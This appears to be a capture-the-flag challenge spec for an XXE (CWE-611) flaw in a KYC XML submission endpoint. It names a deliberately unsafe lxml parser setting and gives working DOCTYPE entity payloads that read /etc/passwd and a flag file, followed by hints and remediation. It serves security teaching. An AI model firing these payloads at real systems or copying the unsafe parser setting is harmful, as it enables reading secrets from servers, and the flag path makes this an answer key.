# xxe_kyc_xml

| Field | Value |
|---|---|
| OWASP | A05:2021 Security Misconfiguration |
| CWE | CWE-611 |
| Difficulty | Hard |
| Chains into | XXE → local file read (e.g. `/etc/passwd`, app source, `.env` if present) |

## Vulnerable code
`modules/xxe_kyc_xml/routes.py: submit_kyc_xml()` parses with
`etree.XMLParser(resolve_entities=True, no_network=False)` — explicit,
unsafe configuration (lxml actually defaults to safe behavior; this models
a developer who turned entity resolution back on, e.g. while debugging,
and never reverted).

## Player path
`POST /kyc/submit-xml` with `Content-Type: application/xml`, body:
```xml
<?xml version="1.0"?>
<!DOCTYPE kyc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<kyc>
  <companyName>&xxe;</companyName>
  <registrationNumber>REG123</registrationNumber>
  <contactEmail>test@test.com</contactEmail>
</kyc>
```
The response's `company_name` field will contain the contents of
`/etc/passwd` instead of a company name — proves the vulnerability.

## Flag location
Read the actual flag file the same way, then submit its exact contents at
`/flags/submit`:
```xml
<!DOCTYPE kyc [<!ENTITY xxe SYSTEM "file:///srv/flags/xxe_flag.txt">]>
```

## Hints
- Hint 1: "This endpoint accepts raw XML — does anything stop you from defining your own DTD?"
- Hint 2: "Whatever field you inject the entity reference into, check if that field's value gets echoed back to you."

## Remediation
- Never enable `resolve_entities=True` on an XML parser handling untrusted input; use the library's safe defaults.
- Explicitly disable DTD processing entirely if the XML format doesn't require one: `etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)`.
- Prefer a schema-validated, DTD-free format (e.g. JSON, or XML validated against XSD with DTDs forbidden) for structured data intake.
